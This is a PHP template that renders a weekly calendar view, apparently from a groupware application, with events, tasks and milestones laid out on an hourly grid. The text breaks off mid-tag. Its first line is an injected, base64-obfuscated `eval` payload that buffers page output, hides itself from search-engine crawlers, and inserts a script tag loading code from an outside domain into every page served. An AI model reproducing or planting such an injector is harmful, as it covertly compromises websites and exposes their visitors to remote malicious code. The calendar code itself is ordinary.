<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<script type="text/javascript">
	scroll_to = -1;
</script>

<?php
define('PX_HEIGHT',42);
$year = isset($_GET['year']) ? $_GET['year'] : (isset($_SESSION['year']) ? $_SESSION['year'] : date('Y'));
$month = isset($_GET['month']) ? $_GET['month'] : (isset($_SESSION['month']) ? $_SESSION['month'] : date('n'));
$day = isset($_GET['day']) ? $_GET['day'] : (isset($_SESSION['day']) ? $_SESSION['day'] : date('j'));

$_SESSION['year'] = $year;
$_SESSION['month'] = $month;
$_SESSION['day'] = $day;

$user_filter = $userPreferences['user_filter'];
$status_filter = $userPreferences['status_filter'];

$user = Users::findById(array('id' => $user_filter));
if ($user == null) $user = logged_user();

$use_24_hours = user_config_option('time_format_use_24');

$tags = active_tag();	
?>
<?php echo stylesheet_tag('event/week.css') ?>
<?php
	$startday = date("d", mktime(0, 0, 0, $month, $day, $year)) - (date("N", mktime(0, 0, 0, $month, $day, $year)) % 7);//inicio de la semana
	$endday = $startday + 7;//fin de la semana
	
	$today = DateTimeValueLib::now();
	$today->add('h', logged_user()->getTimezone());
	$currentday = $today->format("j");
	$currentmonth = $today->format("n");
	$currentyear = $today->format("Y");
	
	$lastday = date("t", mktime(0, 0, 0, $month, 1, $year)); // # of days in the month
	
	$date_start = new DateTimeValue(mktime(0, 0, 0, $month, $startday, $year)); 
	$date_end = new DateTimeValue(mktime(0, 0, 0, $month, $endday, $year)); 
	
	$milestones = ProjectMilestones::getRangeMilestonesByUser($date_start, $date_end, ($user_filter != -1 ? $user : null), $tags, active_project());
	$tasks = ProjectTasks::getRangeTasksByUser($date_start, $date_end, ($user_filter != -1 ? $user : null), $tags, active_project());
	
	$dates = array(); //datetimevalue for each day of week
	$results = array();
	$allday_events_count = array();
	$alldayevents = array();
	$today_style = array();
	
	$month_aux = $month;
	$year_aux = $year;
	
	for ($day_of_week = 0; $day_of_week < 7; $day_of_week++) {	
		
		$day_of_month = $day_of_week + $startday;
		if($day_of_month <= $lastday AND $day_of_month >= 1){ 								
			$w = $day_of_month;
		} elseif($day_of_month < 1) {								
			$w = $day_of_month;
		} else {
			if($day_of_month > $lastday) {
				$month_aux++;
				if($month_aux == 13){
					$month_aux = 1;
					$year_aux++;
				}
			}
			$w = $day_of_month - $lastday;
		}	
		
		$day_tmp = (isset($w) && is_numeric($w)) ? $w : 0;
	
		$dates[$day_of_week] = new DateTimeValue(mktime(0, 0, 0, $month_aux, $day_tmp, $year_aux)); 

		$today_style[$day_of_week] = '';
		if($currentyear == $dates[$day_of_week]->getYear() && $currentmonth == $dates[$day_of_week]->getMonth() && $currentday == $dates[$day_of_week]->getday()) { // Today
			$today_style[$day_of_week] = 'background-color:#FFFFCC;';
		} else if($year == $year_aux && $month == $month_aux && $day == $day_of_month) { // Selected day
			$today_style[$day_of_week] = 'background-color:#F5FFFF;';
		}

		
		$results[$day_of_week] = ProjectEvents::getDayProjectEvents($dates[$day_of_week], $tags, active_project(), $user_filter, $status_filter); 
		if(!$results[$day_of_week]) $results[$day_of_week]=array();
		foreach ($results[$day_of_week] as $key => $event){
			if ($event->getTypeId()> 1){
				$alldayevents[$day_of_week][] = $event;
				unset($results[$day_of_week][$key]);
			}
		}
		if(is_array($milestones)){
			foreach ($milestones as $milestone){
				if ($dates[$day_of_week]->getTimestamp() == mktime(0,0,0,$milestone->getDueDate()->getMonth(),$milestone->getDueDate()->getDay(),$milestone->getDueDate()->getYear())) {	
					$alldayevents[$day_of_week][] = $milestone;
				}			
			}
		}
		if(is_array($tasks)){
			foreach ($tasks as $task){
				if ($dates[$day_of_week]->getTimestamp() == mktime(0,0,0,$task->getDueDate()->getMonth(),$task->getDueDate()->getDay(),$task->getDueDate()->getYear())) {	
					$alldayevents[$day_of_week][] = $task;
				}			
			}
		}
		$allday_events_count[$day_of_week]=  count(array_var($alldayevents, $day_of_week, array()));
	}
	
	$max_events = max($allday_events_count) == 0 ? 1 : max($allday_events_count);
	$alldaygridHeight = $max_events * PX_HEIGHT / 2 + PX_HEIGHT / 2;//Day events container height= all the events plus an extra free space


	$users_array = array();
	$companies_array = array();
	foreach($users as $u)
		$users_array[] = $u->getArrayInfo();
	foreach($companies as $company)
		$companies_array[] = $company->getArrayInfo();	
?>
<div id="calHiddenFields">
	<input type="hidden" id="hfUsers" value="<?php echo clean(str_replace('"',"'", str_replace("'", "\'", json_encode($users_array)))) ?>"/>
	<input type="hidden" id="hfCompanies" value="<?php echo clean(str_replace('"',"'", str_replace("'", "\'", json_encode($companies_array)))) ?>"/>
	<input type="hidden" id="hfUserPreferences" value="<?php echo clean(str_replace('"',"'", str_replace("'", "\'", json_encode($userPreferences)))) ?>"/>
</div>


<div class="calendar" style="padding:0px;height:100%;overflow:hidden;" id="cal_main_div" onmouseup="clearPaintedCells();">
<div id="calendarPanelTopToolbar" class="x-panel-tbar" style="width:100%;height:30px;display:block;background-color:#F0F0F0;"></div>
	
<table style="width:100%;height:100%;">
<tr>
<td>
	<table style="width:100%;height:100%;">
	<tr>
	<td class="coViewHeader" colspan=2 rowspan=1>
	<div class="coViewTitle">
		<span id="chead0"><?php echo  date(lang('date format'), mktime(0, 0, 0, $month, $startday, $year)) ." - ". date(lang('date format'), mktime(0, 0, 0, $month, $endday-1, $year))
		 .' - '. ($user_filter == -1 ? lang('all users') : lang('calendar of', clean($user->getDisplayName())));?></span>	
	</div>		
	</td>
	</tr>
	<tr>
		<td class="coViewBody" style="padding:0px;height:100%;" colspan=2>					
		<div id="chrome_main2" class="printborder" style="border-color: rgb(195, 217, 255); background: rgb(195, 217, 255) none repeat scroll 0% 50%; width:100%; height:100%">
		<div id="allDayGrid" class="inset grid"  style="height: <?php echo $alldaygridHeight ?>px; margin-bottom: 5px;background:#E8EEF7;margin-right:15px;margin-left:40px;position:relative;">
		<?php					
									
			$width_percent = 100/7;
			$width = 0;
			for ($day_of_week = 0; $day_of_week < 7; $day_of_week++) {	
				
				$day_of_month = $day_of_week + $startday;
				// see what type of day it is
				$today_text = "";			
				if($currentyear == $year && $currentmonth == $month && $currentday == $day_of_month){
					$daytitle = 'todaylink';
					$today_text = "Today ";
				}else $daytitle = 'daylink';
				
				// if weekends override do this
				if(cal_option("weekendoverride")){
					// set whether the date is in the past or future/present
					if($day_of_week==0 OR $day_of_week==6){
						$daytype = "weekend";
					}elseif($day_of_month <= $lastday AND $day_of_month >= 1){
						$daytype = "weekday";
					}else{
						$daytype = "weekday_future";
					}
				}else{
					if( !cal_option("start_monday") AND ($day_of_week==0 OR $day_of_week==6) AND $day_of_month <= $lastday AND $day_of_month >= 1){
						$daytype = "weekend";
					}elseif( cal_option("start_monday") AND ($day_of_week==5 OR $day_of_week==6) AND $day_of_month <= $lastday AND $day_of_month >= 1){
						$daytype = "weekend";
					}elseif($day_of_month <= $lastday AND $day_of_month >= 1){
						$daytype = "weekday";
					}else{
						$daytype = "weekday_future";
					}
				}
				// see what type of day it is
				if($currentyear == $year && $currentmonth == $month && $currentday == $day_of_month){
				  $daytitle = 'todaylink';
				  $daytype = "today";
				}elseif($day_of_month > $lastday OR $day_of_month < 1){
					$daytitle = 'extralink';
				}else $daytitle = 'daylink';
				// writes the cell info (color changes) and day of the month in the cell.
				
										
				$dtv_temp = $dates[$day_of_week];
				$p = cal_getlink("index.php?action=viewdate&day=".$dtv_temp->getDay()."&month={$dtv_temp->getMonth()}&year={$dtv_temp->getYear()}");
				$t = cal_getlink("index.php?action=add&day=".$dtv_temp->getDay()."&month={$dtv_temp->getMonth()}&year={$dtv_temp->getYear()}");							

				$format_d_m = str_replace('d', 'j', lang('date format'));
				$format_d_m = str_replace('/Y', '', $format_d_m);
		?>
				<div class="chead cheadNotToday" style="width: <?php echo $width_percent ?>%; left: <?php echo $width ?>%;text-align:center;position:absolute;top:0%;">
					<span id="chead<?php echo $day_of_week ?>">
						<a class="internalLink" href="<?php echo $p; ?>"  onclick="stopPropagation(event) "><?php $dtime = mktime(0, 0, 0, $dtv_temp->getMonth(), $dtv_temp->getDay(), $dtv_temp->getYear()); echo lang(strtolower(date("l", $dtime)) . ' short') . date(' '. $format_d_m, $dtime); ?></a>
					</span>
				</div>
				<div id="allDay<?php echo $day_of_week ?>" class="allDayCell" style="left: <?php echo $width ?>%; height: <?php echo $alldaygridHeight ?>px;border-left:3px double #DDDDDD !important; position:absolute;width:3px;z-index:110;background:#E8EEF7;top:0%;"></div>

				<div id="alldayeventowner" style="width: <?php echo $width_percent ?>%;position:absolute;left: <?php echo $width ?>%; top: 12px;height: <?php echo $alldaygridHeight ?>px;" onclick="showEventPopup(<?php echo $dtv_temp->getDay() ?>, <?php echo $dtv_temp->getMonth()?>, <?php echo $dtv_temp->getYear()?>, -1, -1, <?php echo ($use_24_hours ? 'true' : 'false'); ?>);">
					<?php	
						$top=5;
						if(is_array(array_var($alldayevents,$day_of_week))){
							foreach ($alldayevents[$day_of_week] as $event){
								$tipBody = '';
								$divtype = '';
								$div_prefix = '';
								if ($event instanceof ProjectMilestone ){
									$div_prefix = 'w_ms_div_';									
									$subject = clean($event->getName());
									$img_url = image_url('/16x16/milestone.png');
									$due_date=$event->getDueDate();
									$divtype = '<i>' . lang('milestone') . '</i> - ';
									$tipBody = lang('assigned to') .': '. clean($event->getAssignedToName()) . (trim(clean($event->getDescription())) != '' ? '<br><br>' . trim(clean($event->getDescription())) : '');
								}elseif ($event instanceof ProjectTask){
									$div_prefix = 'w_ta_div_';
									$subject = clean($event->getTitle());
									$img_url = image_url('/16x16/tasks.png');
									$due_date=$event->getDueDate();
									$divtype = '<i>' . lang('task') . '</i> - ';
									$tipBody = lang('assigned to') .': '. clean($event->getAssignedToName()) . (trim(clean($event->getText())) != '' ? '<br><br>' . trim(clean($event->getText())) : '') ;
								}elseif ($event instanceof ProjectEvent){
									$div_prefix = 'w_ev_div_';
									$subject = clean($event->getSubject());
									$img_url = image_url('/16x16/calendar.png'); /* @var $event ProjectEvent */											
									$divtype = '<i>' . lang('event') . '</i> - ';
									$tipBody = (trim(clean($event->getDescription())) != '' ? '<br>' . clean($event->getDescription()) : '');									
								}
								$tipBody = str_replace("\r", '', $tipBody);
								$tipBody = str_replace("\n", '<br>', $tipBody);
								if (strlen_utf($tipBody) > 200) $tipBody = substr_utf($tipBody, 0, strpos($tipBody, ' ', 200)) . ' ...';
								
								if ($event instanceof ProjectEvent || ($dates[$day_of_week]->getTimestamp() == mktime(0,0,0,$due_date->getMonth(),$due_date->getDay(),$due_date->getYear()))) {	
									$dws = $event->getWorkspaces();
									$ws_color = 0;
									if (count($dws) >= 1){
										$ws_color = $dws[0]->getColor();
									}
									cal_get_ws_color($ws_color, $ws_style, $ws_class, $txt_color, $border_color);
					?>
					<div id="<?php echo $div_prefix . $event->getId() ?>" class="adc" style="left: 4%; top: <?php echo $top ?>px; z-index: 5;width: 92%;margin:1px;position:absolute;">
						<div class="t3 <?php echo  $ws_class?>" style="<?php echo  $ws_style?>;margin:0px 1px 0px 1px;height:0px; border-bottom:1px solid; border-color:<?php echo $border_color ?>"></div>
						<div class="noleft <?php echo  $ws_class?>" style="<?php echo  $ws_style?>;border-left:1px solid; border-right:1px solid; border-color:<?php echo $border_color ?>">							
							<div class="" style="overflow: hidden; padding-bottom: 1px;">										
								<nobr style="display: block; text-decoration: none;"><a href='<?php echo $event->getViewUrl()."&amp;view=week"?>' class='internalLink'" onclick="stopPropagation(event);"><img src="<?php echo $img_url?>" align='absmiddle' border='0'> <span style="color:<?php echo $txt_color ?>!important"><?php echo $subject ?></span> </a></nobr>										
							</div>
						</div>
						<div class="t3 <?php echo  $ws_class?>" style="<?php echo  $ws_style?>;margin:0px 1px 0px 1px;height:0px; border-top:1px solid; border-color:<?php echo $border_color ?>"></div>
					</div>
					<script type="text/javascript">
						addTip('<?php echo $div_prefix . $event->getId() ?>', <?php echo json_encode($divtype . $subject) ?>, <?php echo json_encode($tipBody) ?>);
					</script>
					<?php
									$top += 21;
								}	
							}
						}
					?>
				</div>		
		<?php
				$width += $width_percent;
			}
		?>
	</div>
	
	
	<div id="gridcontainer" style="background-color:#fff; position:relative; overflow-x:hidden; overflow-y:scroll; height:504px;">	
			<div id='calowner' style="display:block; width:100%;">  
				<table cellspacing="0" cellpadding="0" border="0" style="table-layout: fixed; width: 100%;height: 100%;">
					<tr>
						<td id="rowheadcell" style="width: 40px;">
							<div id="rowheaders" style="top: 0pt; left: 0pt;">										
							<?php
								for ($hour=0; $hour<=23; $hour++){	
							?>
<div style="height: <?php echo PX_HEIGHT-1?>px; top: 0ex;background: #E8EEF7 none repeat scroll 0%;border-top:1px solid #DDDDDD;left:0pt;width: 100%;" id="rhead<?php echo $hour?>" class="rhead">
<div class="rheadtext" style="text-align:right;padding-right:2px;"><?php echo date($use_24_hours ? "G:i" : "g a", mktime($hour, 0)) ?></div>
</div>												
										<?php
								}
							?>

							</div>
						</td>
						<td id="gridcontainercell" style="width: auto; position:relative" >	
							<div id="grid" style="height: 100%;background-color:#fff;position:relative;" class="grid">										
								<div id="decowner">
									
								</div>
								
							<?php
								for ($hour=0; $hour<=47; $hour++){	
									$curr_hour = date("g");
									if ($hour % 2 == 0){
										$parity = "hruleeven";
										$style="border-top:1px solid #DDDDDD;";
									} else {
										$parity="hruleodd";
										$style="border-top:1px dotted #DDDDDD;";
									}
									$top = (PX_HEIGHT/2) * $hour;
							?>
<div id="r<?php echo $hour?>"" class="hrule <?php echo $parity?>" onmousedown="" onmouseup="" style="top: <?php echo $top?>px; height:0px; z-index:101; position:absolute; left:0px;<?php echo $style?>;width:100%">
<?php $hour == $curr_hour? print("<span id='curr_hour' style='visibility:hidden;height:0px;width:0px'></span>"):print('');?>
</div>
<?php
								}
								
								for ($day_of_week = 0; $day_of_week < 7; $day_of_week++) {										
									$date = $dates[$day_of_week];
									$left = (100/7)*$day_of_week;
									for ($hour=0; $hour<=47; $hour++){
										$top = (PX_HEIGHT/2) * $hour;
								
									$div_id = 'h' . $day_of_week . "_" . $hour; 
									$border_style = ($currentyear == $date->getYear() && $currentmonth == $date->getMonth() && $currentday == $date->getDay()) || ($year == $date->getYear() && $month == $date->getMonth() && $day == $date->getDay()) ? ($hour % 2 == 0 ? "border-top:1px solid #DDDDDD;" : "border-top:1px dotted #DDDDDD;") : ''; 
?>

<div id="<?php echo $div_id?>" style="left:<?php echo $left ?>%;width:<?php echo $width_percent ?>%;top:<?php echo $top?>px;height:21px;position:absolute;z-index: 100;<?php echo $today_style[$day_of_week].$border_style ?>"
onmouseover="if (!selectingCells) overCell('<?php echo $div_id?>'); else paintSelectedCells('<?php echo $div_id?>');"
onmouseout="if (!selectingCells) resetCell('<?php echo $div_id?>');"
onmousedown="selectStartDateTime(<?php echo $date->getDay() ?>, <?php echo $date->getMonth()?>, <?php echo $date->getYear()?>, <?php echo date("G",mktime($hour/2))?>, <?php echo ($hour % 2 == 0) ? 0 : 30 ?>); resetCell('<?php echo $div_id?>'); paintingDay = <?php echo $day_of_week ?>; paintSelectedCells('<?php echo $div_id?>');"
onmouseup="showEventPopup(<?php echo $date->getDay() ?>, <?php echo $date->getMonth()?>, <?php echo $date->getYear()?>, <?php echo date("G",mktime(($hour+1)/2))?>, <?php echo (($hour+1) % 2 == 0) ? 0 : 30 ?>, <?php echo ($use_24_hours ? 'true' : 'false'); ?>);"
></div>

<?php								} ?>
									
									<div id="vd<?php echo $day_of_week ?>" style="left: <?php echo $left ?>%; height: <?php echo (PX_HEIGHT)*24 ?>px;border-left:3px double #DDDDDD !important; position:absolute;width:3px;z-index:110;"></div>
									<div id="eventowner" style="z-index: 120;" onclick="stopPropagation(event) ">
<?php
										$cells = array();
										for ($i = 0; $i < 24; $i++) {
											$cells[$i][0] = 0;
											$cells[$i][1] = 0;
										}
										foreach ($results[$day_of_week] as $event){
											$event->getDuration()->add('s', -1);
											if ($event->getStart()->getMinute() < 30) {
												$cells[$event->getStart()->getHour()][0]++;
												$cells[$event->getStart()->getHour()][1]++;
											} else $cells[$event->getStart()->getHour()][1]++;
											for($i = $event->getStart()->getHour()+1; $i < $event->getDuration()->getHour(); $i++){
												$cells[$i][0]++;
												$cells[$i][1]++;
											}
											if ($event->getDuration()->getMinute() > 0) {
												if ($event->getDuration()->getHour() != $event->getStart()->getHour()) {
													$cells[$event->getDuration()->getHour()][0]++;
													if ($event->getDuration()->getMinute() > 30) $cells[$event->getDuration()->getHour()][1]++;
												}
											}
										}
										$occup = array(); //keys: hora - pos
										foreach ($results[$day_of_week] as $event){
											$event_id = $event->getId();
											$subject = clean($event->getSubject());
											$dws = $event->getWorkspaces();
											$ws_color = 0;
											if (count($dws) >= 1){
												$ws_color = $dws[0]->getColor();
											}	
											
											cal_get_ws_color($ws_color, $ws_style, $ws_class, $txt_color, $border_color);	
											
											if($use_24_hours) $timeformat = 'G:i';
											else $timeformat = 'g:i A';
											$start_time = date($timeformat, $event->getStart()->getTimestamp());
											$end_time = date($timeformat, $event->getDuration()->getTimestamp());
											
											$hr_start = $event->getStart()->getHour();
											$min_start = $event->getStart()->getMinute();
											$hr_end = $event->getDuration()->getHour();
											$min_end = $event->getDuration()->getMinute();
											
											if ($event->getStart() == $event->getDuration()){
												$hr_end++;
											}
											$top = PX_HEIGHT * $hr_start + (PX_HEIGHT*(($min_start*100)/(60*100)));
											$bottom = PX_HEIGHT * $hr_end + (PX_HEIGHT*(($min_end*100)/(60*100)));
											$height = $bottom - $top - 5; //substract 4px for the rounded corners, 1px for separation
											if ($height < PX_HEIGHT/2 - 5) $height = PX_HEIGHT/2 - 5;
											
											$evs_same_time = 0;
											$i = $event->getStart()->getHour();
											if ($event->getStart()->getMinute() < 30) {
												if ($cells[$i][0] > $evs_same_time) $evs_same_time = $cells[$i][0];
												if ($cells[$i][1] > $evs_same_time) $evs_same_time = $cells[$i][1];
											} else if ($cells[$i][1] > $evs_same_time) $evs_same_time = $cells[$i][1];
											
											for($i = $event->getStart()->getHour()+1; $i < $event->getDuration()->getHour(); $i++){
												if ($cells[$i][0] > $evs_same_time) $evs_same_time = $cells[$i][0];
												if ($cells[$i][1] > $evs_same_time) $evs_same_time = $cells[$i][1];
											}
											$i = $event->getDuration()->getHour();
											if ($event->getDuration()->getMinute() > 0) {
												if ($cells[$i][0] > $evs_same_time) $evs_same_time = $cells[$i][0];
												if ($event->getDuration()->getMinute() > 30) {
													if ($cells[$i][1] > $evs_same_time) $evs_same_time = $cells[$i][1];
												}
											}
											
											$posHoriz = 0;
											$canPaint = false;
											while (!$canPaint) {
												$canPaint = true;
												if ($event->getStart()->getMinute() < 30) {
													$canPaint = !(isset($occup[$event->getStart()->getHour()][0][$posHoriz]) && $occup[$event->getStart()->getHour()][0][$posHoriz]
															 || isset($occup[$event->getStart()->getHour()][1][$posHoriz]) && $occup[$event->getStart()->getHour()][1][$posHoriz]);
												} else {
													$canPaint = !(isset($occup[$event->getStart()->getHour()][1][$posHoriz]) && $occup[$event->getStart()->getHour()][1][$posHoriz]);
												}
												for($i = $event->getStart()->getHour()+1; $canPaint && $i < $event->getDuration()->getHour(); $i++) {
													if (isset($occup[$i][0][$posHoriz]) && $occup[$i][0][$posHoriz] || isset($occup[$i][1][$posHoriz]) && $occup[$i][1][$posHoriz]) {
														$canPaint = false;
													}																
												}
												if ($canPaint) {
													if ($event->getDuration()->getMinute() > 30) {
														$canPaint = !(isset($occup[$event->getDuration()->getHour()][0][$posHoriz]) && $occup[$event->getDuration()->getHour()][0][$posHoriz]
														|| isset($occup[$event->getDuration()->getHour()][1][$posHoriz]) && $occup[$event->getDuration()->getHour()][1][$posHoriz]);
													} else {
														$canPaint = !(isset($occup[$event->getDuration()->getHour()][1][$posHoriz]) && $occup[$event->getDuration()->getHour()][1][$posHoriz]);
													}
												}
												
												if (!$canPaint) $posHoriz++;
											}
											
											$width = (100/7) / $evs_same_time;
											$left = $width * $posHoriz + ((100/7) * $day_of_week) + 0.25;
											$width -= 0.2;
											
											if ($event->getStart()->getMinute() < 30) {
												$occup[$event->getStart()->getHour()][0][$posHoriz] = true;
												$occup[$event->getStart()->getHour()][1][$posHoriz] = true;
											} else {
												$occup[$event->getStart()->getHour()][1][$posHoriz] = true;
											}
											for($i = $event->getStart()->getHour()+1; $i < $event->getDuration()->getHour(); $i++) {
												$occup[$i][0][$posHoriz] = true;
												$occup[$i][1][$posHoriz] = true;
											}
											if ($event->getDuration()->getMinute() > 0) {
												$occup[$event->getDuration()->getHour()][0][$posHoriz] = true;
												if ($event->getDuration()->getMinute() > 30) {
													$occup[$event->getDuration()->getHour()][1][$posHoriz] = true;
												}
											}
											
											$event->getDuration()->add('s', 1);
											$end_time = date($timeformat, $event->getDuration()->getTimestamp());
											if ($posHoriz + 1 == $evs_same_time) $width = $width - 0.5;
											
											$tipBody = $event->getStart()->format($use_24_hours ? 'G:i' : 'g:i A') .' - '. $event->getDuration()->format($use_24_hours ? 'G:i' : 'g:i A') . (trim(clean($event->getDescription())) != '' ? '<br><br>' . clean($event->getDescription()) : '');
											$tipBody = str_replace("\r", '', $tipBody);
											$tipBody = str_replace("\n", '<br>', $tipBody);
											if (strlen_utf($tipBody) > 200) $tipBody = substr_utf($tipBody, 0, strpos($tipBody, ' ', 200)) . ' ...';
											
											$ev_duration = DateTimeValueLib::get_time_difference($event->getStart()->getTimestamp(), $event->getDuration()->getTimestamp()); 
?>
											<script type="text/javascript">
												if (<?php echo $top; ?> < scroll_to || scroll_to == -1) {
													scroll_to = <?php echo $top;?>;
												}
												addTip('w_ev_div_' + <?php echo $event->getId() ?>, <?php echo json_encode(clean($event->getSubject())) ?>, <?php echo json_encode($tipBody);?>);
											</script>
											
						<div id="w_ev_div_<?php echo $event->getId()?>" class="chip" style="position: absolute; top: <?php echo $top?>px; left: <?php echo $left?>%; width: <?php echo $width?>%;z-index:120;"  onclick="stopPropagation(event)" onmouseup="clearPaintedCells()">
						<div class="t1 <?php echo $ws_class ?>" style="<?php echo $ws_style ?>;margin:0px 2px 0px 2px;height:0px; border-bottom:1px solid;border-color:<?php echo $border_color ?>"></div>
						<div class="t2 <?php echo $ws_class ?>" style="<?php echo $ws_style ?>;margin:0px 1px 0px 1px;height:1px; border-left:1px solid;border-right:1px solid;border-color:<?php echo $border_color ?>"></div>
						<div class="chipbody edit og-wsname-color-<?php echo $ws_color?>">
						<dl class="<?php echo  $ws_class?>" style="height: <?php echo $height ?>px;<?php echo $ws_style?>;border-left:1px solid;border-right:1px solid;border-color:<?php echo $border_color ?>" onclick="og.openLink(og.getUrl('event', 'viewevent', {view:'week', id:<?php echo $event->getId()?>, user_id:<?php echo $user_filter?>}, null));">
							<dt class="<?php echo  $ws_class?>" style="<?php echo $ws_style?>;">
							<table width="100%"><tr><td>
								<a 
								href='<?php echo cal_getlink("index.php?action=viewevent&amp;view=week&amp;id=".$event->getId())."&amp;user_id=".$user_filter;?>'
								onclick="stopPropagation(event);"
								class='internalLink'><div style="color:<?php echo $txt_color?>!important;padding-left:5px;font-size:93%;"><?php echo "$start_time"?></div></a>
							</td><td align="right">
								<dd><div align="right" style="padding-right:4px;<?php echo ($ev_duration['hours'] == 0 ? 'height:'.$height.'px;' : '') ?>">
								<?php
								if ($user_filter != -1) { 
									$invitations = $event->getInvitations();
									if ($invitations != null && is_array($invitations) && $invitations[$user_filter] != null) {
										$inv = $invitations[$user_filter];
										
										if ($inv->getInvitationState() == 0) { // Not answered
											echo '<img src="' . image_url('/16x16/mail_mark_unread.png') . '"/>';
										} else if ($inv->getInvitationState() == 1) { // Assist = Yes
											echo '<img src="' . image_url('/16x16/complete.png') . '"/>';
										} else if ($inv->getInvitationState() == 2) { // Assist = No
											echo '<img src="' . image_url('/16x16/del.png') . '"/>';
										} else if ($inv->getInvitationState() == 3) { // Assist = Maybe
											echo '<img src="' . image_url('/16x16/help.png') . '"/>';
										} else {
											//echo "Not Invited";
										}
									} // if
								} // if ?>
								</div></dd>
							</td></tr></table>
							</dt>
							<?php
							if ($ev_duration['hours'] > 0) { ?>
							<dd>
							<div><a
